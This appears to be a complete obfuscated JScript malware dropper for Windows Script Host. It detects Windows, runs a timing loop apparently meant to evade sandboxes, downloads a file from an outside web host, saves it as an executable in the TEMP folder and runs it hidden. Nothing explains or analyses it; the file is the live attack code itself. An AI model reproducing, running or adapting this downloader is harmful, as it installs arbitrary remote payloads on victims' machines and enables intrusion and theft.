var h1 = false;
var m = "CreateObject";
var Xe = function rG() {return WScript[m]("WScript.Shell");}(), ly = 11;
var Sj = "MSXML2.XMLHTTP";
var dO = 2123213;
var tZ = 0;
function vs(dh){Xe["Run"](dh, tZ, tZ);};
function C(){return "" + Sj;};
function J(NU, N1){tZ = tZ * 1; return NU - N1;};
function x(){return m;};
/*@cc_on
  @if (@_win32 || @_win64)
    h1 = true;
  @end
@*/
if (h1)
{
var v = "";
function w(){return 22;};
var q0 = 0; var N0 = 0;
function fi()
{
var N = new this["Date"]();
var x0 = N["getUTCMilliseconds"]();
WScript["Sleep"](w());
var N = new this["Date"]();
var C0 = N["getUTCMilliseconds"]();
WScript["Sleep"](w());
var N = new this["Date"]();
var n = N["getUTCMilliseconds"]();
var q0 = "h0";
q0 = J(C0, x0);
var N0 = "CO";
N0 = J(n, C0);
v = "open";
return J(q0, N0);
}
var C1 = false;
var jR = false;
for (var d = tZ; d < w() * 1; d++){if (fi() != tZ){
C1 = true; 
N0 = "31" + 11 * q0 + N0; 
jR = true; 
break;
}}
function h() {return ((C1 == true) && (C1 == jR)) ? 1 : tZ;};
if (C1 && h() && jR){
function O() {return Xe["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "KqForacivWG.exe";};
 a = C();
 x1 = WScript[m](a);
 var Xn = 1;
 while (Xn){
try {
x1[v]("GET", "http://pasticceriabonci.it/m1psa", false);
x1["send"]();
P = "Sleep";
for (;;){WScript[P](w() * 11); if (x1["readystate"] >= 2 * 2) break;};
Xn = tZ;
} catch(XA){};
}
function XJ(q) {var Cy = (1, 2, 3, 4, 5, q); return Cy;};
B = WScript[x()]("ADODB.Stream");
a = B;
a[v]();
a["type"] = XJ(1);
a["write"](x1["ResponseBody"]);
B["position"] = XJ(tZ);
a["Save" + "ToFile"](O(), 2);
B["c"+"lose"]();
J0 = O();
vs(J0);
}
}

